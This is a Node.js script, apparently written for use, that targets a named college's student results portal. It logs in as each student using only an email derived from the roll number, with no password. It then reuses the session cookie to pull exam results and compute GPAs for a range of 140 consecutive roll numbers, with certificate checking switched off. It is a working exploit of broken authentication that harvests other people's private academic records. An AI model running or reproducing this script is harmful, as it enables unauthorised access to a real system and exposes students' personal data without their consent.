const axios = require("axios");
const https = require("https");

const apiClient = axios.create({
  baseURL: "http://rajalakshmi.in",
  headers: {
    "User-Agent":
      "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    Accept: "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/json; charset=utf-8",
    "X-Requested-With": "XMLHttpRequest",
    Origin: "http://rajalakshmi.in",
    Referer: "http://rajalakshmi.in/UI/Modules/Login/UniLogin.aspx",
  },
  httpsAgent: new https.Agent({ rejectUnauthorized: false }), // Bypass SSL issues if any
});

// Grade point mapping
const gradePoints = { O: 10, "A+": 9, A: 8, "B+": 7, B: 6, C: 5, P: 4, U: 0 };

// Function to log in and get a session ID
async function loginAndGetSession(rollNumber) {
  try {
    const loginData = {
      PuniVMenulist: `${rollNumber}@rajalakshmi.edu.in`,
      RoleID: 0,
    };

    const response = await apiClient.post(
      "/UI/Modules/Login/UniLogin.aspx/VlidateUser",
      loginData
    );

    const setCookieHeader = response.headers["set-cookie"];
    if (!setCookieHeader) throw new Error("Failed to retrieve session cookie");

    const sessionCookie = setCookieHeader.find((cookie) =>
      cookie.startsWith("ASP.NET_SessionId")
    );
    if (!sessionCookie) throw new Error("Session ID not found in cookies");

    return sessionCookie.split(";")[0]; // Extract session ID
  } catch (error) {
    return null; // Return null if login fails
  }
}

// Function to fetch results and calculate GPA
async function fetchResults(rollNumber, sessionId) {
  try {
    const resultData = {
      AcademicYearId: 0,
      CourseId: 0,
      SemesterId: 0,
      PersonId: 0,
    };

    const response = await apiClient.post(
      "/UI/Modules/UniCurrentResult.aspx/GetResult",
      resultData,
      {
        headers: {
          Cookie: `G_ENABLED_IDPS=google; ${sessionId}`,
          Referer:
            "http://rajalakshmi.in/UI/Modules/uniCurrentResult.aspx?FormHeading=Examination%20Result",
        },
      }
    );

    if (!response.data || !response.data.d) return null;

    const resultJson = JSON.parse(response.data.d);
    if (!Array.isArray(resultJson) || resultJson.length === 0) return null;

    let totalCredits = 0,
      totalGradePoints = 0;

    resultJson.forEach((result) => {
      const grade = result.Grade || "NA";
      const credits = result.CREDITS || 0;

      if (grade in gradePoints && credits > 0) {
        totalCredits += credits;
        totalGradePoints += gradePoints[grade] * credits;
      }
    });

    return totalCredits > 0
      ? (totalGradePoints / totalCredits).toFixed(2)
      : "N/A";
  } catch (error) {
    return null; // Return null if fetching results fails
  }
}

// Main function to process multiple students
async function processStudents(startRollNumber, range) {
  console.log(`\n📊 GPA Results:\n`);

  for (let i = 0; i < range; i++) {
    let rollNumber = (startRollNumber + i).toString();

    const sessionId = await loginAndGetSession(rollNumber);
    if (!sessionId) {
      console.log(`${rollNumber} : Login Failed`);
      continue;
    }

    const GPA = await fetchResults(rollNumber, sessionId);
    console.log(`${rollNumber} : ${GPA !== null ? GPA : "No Data"}`);
  }
}

// Usage example
const startRollNumber = 211001001; // Change this
const range = 140; // Change this to the number of students to process

processStudents(startRollNumber, range);
